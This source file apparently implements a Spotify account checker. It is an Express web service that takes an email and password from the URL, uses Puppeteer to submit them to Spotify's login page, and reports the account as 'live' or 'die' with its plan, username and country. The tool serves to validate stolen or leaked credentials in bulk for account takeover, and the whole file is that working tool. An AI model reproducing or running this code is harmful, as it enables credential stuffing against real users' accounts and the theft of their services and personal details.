const express = require("express");
const app = express();
const puppeteer = require("puppeteer");

app.get("/:email/:password", async (request, response) => {
  var email = request.params.email;
  var password = request.params.password;
  var res = {};
  if (!email || !password) {
    res.message = "Failed";
  } else {
    var data = {
      email: email,
      password: password
    };
    res.message = "Success";

    var result = await getResult(data);
    if (result.status) {
      res.data = {
        status: "live",
        plan: result.plan,
        profile: {
          username: result.profile[0].value,
          country: result.profile[3].value
        }
      };
    } else {
      res.data = {
        status: "die",
        plan: "",
        profile: "" 
      };
    }
  }
  response.send(res);
});

app.get("/", (request, response) => {
  response.send(
    "How to Use: <pre>localhost/{email}/{password}</pre><div>cr: n0buholic</div>"
  );
});

const listener = app.listen(process.env.PORT, () => {
  console.log("Your app is listening on port " + listener.address().port);
});

async function getResult(data) {
  let url =
    "https://accounts.spotify.com/id/login";
  return new Promise(async (resolve, reject) => {
    puppeteer.launch({ args: ["--no-sandbox"] }).then(async browser => {
      var page = await browser.newPage();
      
      await page.on("response", async res => {
        if (res.url() == "https://accounts.spotify.com/login/password") {
          if (isJson(await res.text())) {
            var json = JSON.parse(await res.text());
            if (json.error) {
              var data = {}
              data.status = false;
              resolve(data);
            }
          }
        }

        if (res.url() == "https://www.spotify.com/id/api/account/overview/") {
          if (isJson(await res.text())) {
            var json = JSON.parse(await res.text());
            var data = {}
            data.status = true;
            data.plan = json.props.plan.plan.name;
            data.profile = json.props.profile.fields;
            resolve(data);
          }
        }
      });
      try {
        await page.goto(url, { waitUntil: "networkidle2" });
        await page.type("#login-username", data.email);
        await page.type("#login-password", data.password);
        await page.click("#login-button");
        await page.waitFor(3000)
        await page.goto("https://www.spotify.com/id/account/overview/");
      } catch (error) {
        console.log(error);
      }
    });
  });
}

function isJson(str) {
  try {
    JSON.parse(str);
  } catch (e) {
    return false;
  }
  return true;
}
